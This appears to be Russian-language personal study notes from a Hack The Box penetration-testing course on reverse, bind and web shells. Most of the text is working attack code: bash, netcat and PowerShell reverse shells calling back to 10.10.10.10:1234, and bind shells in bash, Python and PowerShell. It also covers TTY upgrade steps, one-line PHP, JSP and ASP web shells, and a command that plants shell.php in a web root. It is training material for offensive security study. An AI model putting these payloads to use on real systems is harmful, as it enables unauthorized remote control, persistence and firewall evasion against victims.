Виды оболочек

Тип      	    Метод коммуникации

Reverse Shell	    Устанавливает обратное соединение с нашей системой и предоставляет нам управление через обратное подключение.

Bind Shell	    Он ждет, пока мы подключимся, и передает нам управление, как только это произойдет.

Web Shell	    Программа взаимодействует через веб-сервер, принимает наши команды по HTTP-параметрам, выполняет их и выводит результат.






Reverse Shell (Обратная оболочка)
Первый шаг — запустить netcatпрослушиватель на выбранном нами порту:

SavitskiyES@htb\[/htb]$ nc -lvnp 1234 (прослушивать наш порт на входящее соединение с удаленного\\взломанного хоста для получения удаленного доступа)


-l	Режим прослушивания, позволяющий ожидать подключения к нам
-v	Подробный режим, позволяющий узнать, когда установлено соединение.
-n	Отключите разрешение DNS и подключайтесь только с/к IP-адресам, чтобы ускорить соединение.
-p 1234	Порт, netcatна котором осуществляется прослушивание, должен быть отправлен обратный запрос.


нам понадобится наш ip
SavitskiyES@htb\[/htb]$ ip a

Доп инфо
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary


Установка обратного соединения на bash скомпрометированных хостах

Bash
bash -c 'bash -i >\& /dev/tcp/10.10.10.10/1234 0>\&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 10.10.10.10 1234 >/tmp/f

power shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();\[byte\[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>\&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = (\[text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"







 Bind Shell (Связывающая оболочка)
Не мы подключаемся к себе с удаленного хоста а наоборот
Установка соединения для прослушивания на порту '1234' на удаленном хосте с IP-адресом '0.0.0.0', 

чтобы иметь возможность подключаться к нему из любой точки мира.

bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>\&1|nc -lvp 1234 >/tmp/f

python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF\_INET,s.SOCK\_STREAM);s1.setsockopt(s.SOL\_SOCKET,s.SO\_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = \[System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>\&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();



После выполнения команды bind shell на указанном порту должна появиться ожидающая оболочка. можно к ней подключиться.
SavitskiyES@htb\[/htb]$ nc 10.10.10.1 1234



id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Примечание:
Если команда оболочки bind будет остановлена ​​по какой-либо причине или удаленный хост будет перезагружен. Нужно повторно использовать уязвимость.



один из методов python/stty
SavitskiyES@htb\[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
Переводим  ctrl+zв фоновый режим работы оболочки
вернемся к локальному терминалу, где введем следующую stty команду
www-data@remotehost$ ^Z



SavitskiyES@htb\[/htb]$ stty raw -echo

SavitskiyES@htb\[/htb]$ fg



\[Enter]

\[Enter]

www-data@remotehost$
После нажатия клавиши Enter fg оболочка вернется netcat на передний план
reset + Enter чтобы снова открыть ее


чтобы получить наши переменные:
SavitskiyES@htb\[/htb]$ echo $TERM



xterm-256color
(посмотреть TERM переменную)

SavitskiyES@htb\[/htb]$ stty size



67 318
(посмотреть  значения для rows и columns)

Теперь, когда у нас есть наши переменные, мы можем вернуться в нашу 
netcat оболочку и использовать следующую команду для их исправления:

www-data@remotehost$ export TERM=xterm-256color



www-data@remotehost$ stty rows 67 columns 318

После этого у нас должна появиться netcatоболочка, использующая все возможности терминала, подобно SSH-соединению







Веб-оболочка
нужно написать веб-оболочку, которая будет принимать нашу команду через GETзапрос, выполнять её и выводить результат

php
<?php system($\_REQUEST\["cmd"]); ?>

jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

asp
<% eval request("cmd") %>

Получив веб-оболочку, необходимо поместить скрипт веб-оболочки в веб-каталог 
(корневой каталог) удаленного хоста, чтобы выполнить его через веб-браузер
используем уязвимость в функции загрузки файлов, которая позволит записать один из скриптов в файл, 

shell.php загрузить его, а затем получить доступ к загруженному файлу для выполнения команд.
если только удалённое выполнение команд через эксплойт напрямую отправить оболочку в корневой каталог веб-сервера, 

чтобы получить к нему доступ

Веб-сервер	Корневая папка веб-сервера по умолчанию

Apache	        /var/www/html/

Nginx	        /usr/local/nginx/html/

IIS	        c:\\inetpub\\wwwroot\\

XAMPP    	C:\\xampp\\htdocs\\

проверить эти каталоги(пример для хоста Linux):
echo '<?php system($\_REQUEST\["cmd"]); ?>' > /var/www/html/shell.php

 получить доступ через браузер перейти на shell.php страницу скомпрометированного 
веб-сайта и использовать команду ?cmd=id для выполнения следующей id команды
http://SERVER\_IP:PORT/shell.php?cmd=id

использовать cURL:
SavitskiyES@htb\[/htb]$ curl http://SERVER\_IP:PORT/shell.php?cmd=id



uid=33(www-data) gid=33(www-data) groups=33(www-data)


ВАВЖНОЕ ПРИМЕЧАНИЕ:
Преимущество веб-оболочки заключается в том, что она обходит любые ограничения брандмауэра, поскольку не открывает новое соединение на порту, а работает на веб-порту 80или 443любом другом порту, используемом веб-приложением, если скомпрометированный хост будет перезагружен, веб-оболочка останется активной

